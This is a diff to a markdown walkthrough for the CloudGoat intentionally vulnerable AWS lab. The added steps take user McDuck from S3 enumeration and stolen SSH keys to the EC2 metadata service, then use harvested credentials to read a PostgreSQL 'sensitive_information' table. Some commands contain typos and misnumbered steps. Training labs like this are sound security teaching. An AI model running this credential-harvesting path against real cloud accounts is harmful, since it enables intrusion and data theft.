@@ -375,16 +375,18 @@ This appears to be a bash_history file with credentials in it
  `\dt`  
  20. Read the sensitive information    
  `select * from sensitive_information;`    
- **Goal Achieved** 
+ **Goal Achieved as Lara** 
 
 #### Remove rce_web_app Lara data
 1. Quit the DB    
 `\q`
-2. Remove your public ssh key  
-`vim ~/.ssh/authorized_keys`
+2. Remove your public ssh key   
+`vim ~/.ssh/authorized_keys`    
 3. Leave the AWS instance    
 *CTRL+d*  
-4. Remove Lara's AWS CLI profile
+4. Remove the downloaded log file    
+`rm 555*.log` tab for autocomplete    
+5. Remove Lara's AWS CLI profile   
 
 ### rce_web_app as McDuck
 1. Create an AWS CLI profile for McDuck   
@@ -393,8 +395,46 @@ This appears to be a bash_history file with credentials in it
     * AWS Secret Access Key: __mcduck aws_secret_access_key__   
     * Default region name: __us-east-1__   
     * Default output format: __leave blank__   
-
-
+2. Look for information at S3 bucket storage   
+`aws s3 ls --profile mcduck`   
+3. Recursively look thorugh the S3 buckets    
+`aws s3 ls s3://<S3bucket> --recursive --ducky`
+4. Copy the two interesting findings in the keystore bucket to your local directory   
+`aws s3 cp s3://<S3bucket>/cloudgoat . --profile mcduck`    
+`aws s3 cp s3://<S3bucket>/cloudgoat.pub --profile mcduck`     
+5. Review the downloaded files   
+`cat cloudgoat`     
+`cat cloudgoat.pub`    
+6. Describe the EC2 instances for an IP address to use the ssh keys with   
+`aws ec2 describe-instances --profile mcduck`   
+7. Use the resulting public IP to ssh into the instance   
+`chmod 400 cloudgoat`     
+`ssh -i cloudgoat ubuntu@3.231.102.10`    
+17. Now that we're on an AWS system, curl the AWS metadata server to see what information can be obtained    
+`curl -v http://169.254.169.254/`   
+`curl -v http://169.254.169.254/latest/`   
+`curl -v http://169.254.169.254/user-data/`   
+This appears to be a bash_history file with credentials in it   
+18. Using the credentials found, log into postgreSQL    
+`psql postgresql://<usr>:<pass>@<rds-instance>:5432/<db_name>`   
+ 19. Access the database tables    
+ `\dt`  
+ 20. Read the sensitive information    
+ `select * from sensitive_information;`    
+ **Goal Achieved as McDuck**   
+ 
+ ### Remove rce_web_app McDuck data
+ 1. Exit the AWS system
+ 2. Remove downloaded files
+ `rm -rf cloudgoat`     
+ `rm cloudgoat.pub`   
+ 3. Remove the McDuck AWS CLI profile
+ 
+  ### Alternative Variance
+ There are several walkthroughs out there for different paths that can be taken by both Lara and McDuck. 
+ This walkthrough only covers what is commonly reffered to as "living off of the land".     
+ Alternative walthroughs involve downloading awscli from the aws system after sshing in.
+ 
 ## codebuild_secrets
 1. Create scenario  
 `./cloudgoat.py create codebuild_secrets --profile goat`  
